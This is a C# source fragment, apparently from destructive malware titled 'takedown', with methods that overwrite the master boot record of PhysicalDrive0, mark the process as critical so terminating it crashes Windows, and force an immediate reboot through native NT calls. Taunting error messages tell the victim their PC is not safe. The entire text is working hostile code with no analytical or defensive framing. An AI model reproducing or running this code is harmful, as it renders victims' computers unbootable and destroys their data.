        public static bool OverwriteBootRecord()
        {
            IntPtr hDrive;
            uint dwWrittenBytes;
            bool bSuccess;

            hDrive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_WRITE | FILE_SHARE_READ, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);

            if (hDrive == INVALID_HANDLE_VALUE)
            {
                MessageBox.Show("that wasn't supposed to happen", "takedown", MessageBoxButtons.OK, MessageBoxIcon.Error);
                CloseHandle(hDrive);

                return false;
            }

            bSuccess = WriteFile(hDrive, pccMasterBootRecord, 512, out dwWrittenBytes, IntPtr.Zero);

            if (!bSuccess)
            {
                MessageBox.Show("alright fine u win, but that doesnt mean ur pc is safe tho :D", "takedown", MessageBoxButtons.OK, MessageBoxIcon.Error);
                CloseHandle(hDrive);

                return false;
            }

            CloseHandle(hDrive);
            return true;
        }

        public static bool SetProcessCritical()
        {
            int isCritical = CurrentProcessIsCritical;
            Process process = Process.GetCurrentProcess();
            NtSetInformationProcess(process.Handle, ProcessBreakOnTermination, ref isCritical, sizeof(int));

            return true;
        }

        public static bool ForceShutdownComputer()
        {
            RtlAdjustPrivilege(19, true, false, out bool _);
            NtSetSystemPowerState(POWER_ACTION.PowerActionShutdownReset, SYSTEM_POWER_STATE.PowerSystemShutdown, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY);
            NtShutdownSystem(SHUTDOWN_ACTION.ShutdownReboot);

            return true;
        }
